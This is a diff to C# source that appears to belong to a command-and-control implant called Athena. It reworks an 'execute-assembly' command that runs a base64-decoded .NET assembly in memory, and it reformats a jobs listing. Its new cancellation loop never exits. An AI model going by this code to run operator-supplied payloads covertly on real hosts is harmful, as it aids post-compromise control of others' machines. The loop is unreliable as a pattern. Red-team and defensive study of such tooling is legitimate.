@@ -53,7 +53,6 @@ namespace Athena.Commands
                         var t = Task.Run(() =>
                         {
                             Globals.executeAssemblyTask = job.task.id;
-                            bool running = true;
                             ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
                             job.hasoutput = true;
                             using (var consoleWriter = new ConsoleWriter()) {
@@ -61,28 +60,54 @@ namespace Athena.Commands
                                 try
                                 {
                                     consoleWriter.WriteLineEvent += consoleWriter_WriteLineEvent;
+
+                                    //Set output for our ConsoleWriter
                                     Console.SetOut(consoleWriter);
-                                    AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), "");
-                                    while (running)
+
+                                    //Start a new thread for our blocking Execute-Assembly
+                                    var thread = new Thread(() =>
+                                    {
+                                        try
+                                        {
+                                            job.hasoutput = true;
+                                            AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), "");
+                                            //Assembly finished executing.
+                                            Globals.executeAssemblyTask = "";
+                                            job.hasoutput = true;
+                                            job.complete = true;
+                                            Console.SetOut(origStdout);
+                                        }
+                                        catch (ThreadInterruptedException e)
+                                        {
+                                            //Cancellation was requested, clean up.
+                                            Globals.executeAssemblyTask = "";
+                                            job.hasoutput = true;
+                                            job.complete = true;
+                                            job.errored = true;
+                                            Console.SetOut(origStdout);
+                                        }
+                                    });
+
+                                    thread.IsBackground = true;
+                                    //Start our assembly.
+                                    thread.Start();
+                                    while (true)
                                     {
                                         if (job.cancellationtokensource.IsCancellationRequested)
                                         {
-                                            job.complete = true;
-                                            AssemblyHandler.ClearAssemblyLoadContext();
-                                            running = false;
-                                            Console.SetOut(origStdout);
-                                            Globals.executeAssemblyTask = "";
+                                            //Kill the assembly
+                                            thread.Interrupt();
                                         }
                                     }
                                 }
                                 catch(Exception e)
                                 {
+                                    //General exception catching
                                     Globals.executeAssemblyTask = "";
                                     job.complete = true;
                                     job.taskresult = e.Message;
                                     job.errored = true;
                                     job.hasoutput = true;
-                                    running = false;
                                     Console.SetOut(origStdout);
                                 }
                             }
@@ -113,20 +138,20 @@ namespace Athena.Commands
                 case "jobs":
                     Task.Run(() => {
                         string output = "ID\t\t\t\t\t\tName\t\tStatus\r\n";
-                        output += "------------------------------------------------------------------------\r\n";
+                        output += "-----------------------------------------------------------------------------------\r\n";
                         foreach (var job in Globals.jobs)
                         {
                             if (job.Value.started)
                             {
-                                output += String.Format("{0}\t\t{1}\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Started");
+                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Started");
                             }
                             else if (job.Value.complete)
                             {
-                                output += String.Format("{0}\t\t{1}\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Completed");
+                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Completed");
                             }
                             else
                             {
-                                output += String.Format("{0}\t\t{1}\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Not Started");
+                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Not Started");
                             }
                         }
                         task.hasoutput = true;
@@ -263,6 +288,7 @@ namespace Athena.Commands
                 job.hasoutput = false;
             }
         }
+
         static void consoleWriter_WriteLineEvent(object sender, ConsoleWriterEventArgs e)
         {
             try
